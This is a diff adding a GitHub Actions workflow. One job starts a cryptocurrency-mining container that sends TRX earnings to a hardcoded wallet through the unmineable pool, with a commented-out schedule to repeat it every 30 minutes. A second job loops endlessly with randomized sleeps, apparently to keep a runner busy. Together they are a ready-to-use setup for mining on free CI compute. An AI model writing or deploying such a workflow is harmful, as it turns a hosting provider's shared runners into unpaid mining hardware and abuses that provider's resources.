@@ -1,0 +1,43 @@
+name: Run Mining Container and Hello Script
+
+on:
+  workflow_dispatch:  # Manual trigger
+  # Uncomment below for scheduled runs (e.g., every 30 minutes)
+  # schedule:
+  #   - cron: '*/30 * * * *'
+
+jobs:
+  run-docker-container:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+    
+    - name: Run mining container
+      run: |
+        docker run --restart unless-stopped --name node -d \
+          -e POOL="rx.unmineable.com:3333" \
+          -e COIN="TRX" \
+          -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
+          -e WORKER_NAME="github1" \
+          thechristech/unmineable:latest
+        
+        # Keep container running for a specific duration
+        # GitHub Actions has a 6-hour limit for jobs
+        sleep 3600  # Run for 1 hour
+        docker stop node
+        docker rm node
+
+  hello-script:
+    needs: run-docker-container
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Run hello script continuously
+      run: |
+        while true; do
+          echo "hello"
+          # Generate random sleep between 60-120 seconds
+          sleep $((RANDOM % 61 + 60))
+        done
